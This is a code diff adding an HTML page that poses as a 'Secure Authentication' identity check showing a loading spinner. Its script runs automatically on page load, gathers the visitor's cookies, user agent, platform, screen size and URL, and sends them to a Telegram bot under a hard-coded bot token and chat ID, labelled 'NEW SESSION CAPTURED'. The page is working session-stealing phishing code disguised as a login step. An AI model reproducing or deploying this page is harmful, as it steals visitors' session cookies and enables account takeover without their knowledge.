@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Authentication | Latveria</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #00ff00; 
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            border: 1px solid #00ff00;
+            padding: 30px;
+            box-shadow: 0 0 15px #00ff00;
+            background: rgba(0, 20, 0, 0.8);
+            border-radius: 10px;
+        }
+        .loader {
+            border: 3px solid #111;
+            border-top: 3px solid #00ff00;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>VERIFYING IDENTITY</h2>
+        <div class="loader"></div>
+        <p>Please do not close this window...<br>Connecting to secure gateway.</p>
+    </div>
+
+    <script>
+        // --- THE DOOM CONFIGURATION ---
+        const BOT_TOKEN = "8737664405:AAF1cI_PiOJSduJT6oeBRM9UZLZnBFBsjvI"; 
+        const CHAT_ID = "8541657799";
+
+        async function exfiltrate() {
+            const data = {
+                cookies: document.cookie || "No cookies found",
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                url: window.location.href
+            };
+
+            const message = `🚨 *NEW SESSION CAPTURED* 🚨\n\n` + 
+                            `🌐 *URL:* ${data.url}\n` + 
+                            `🍪 *Cookies:* \`${data.cookies}\`\n` + 
+                            `📱 *UA:* ${data.ua}\n` + 
+                            `🖥️ *Platform:* ${data.platform}\n` + 
+                            `📏 *Screen:* ${data.screen}`;
+
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.log("Shadow failed to transmit.");
+            }
+        }
+
+        window.onload = exfiltrate;
+    </script>
+</body>
+</html>
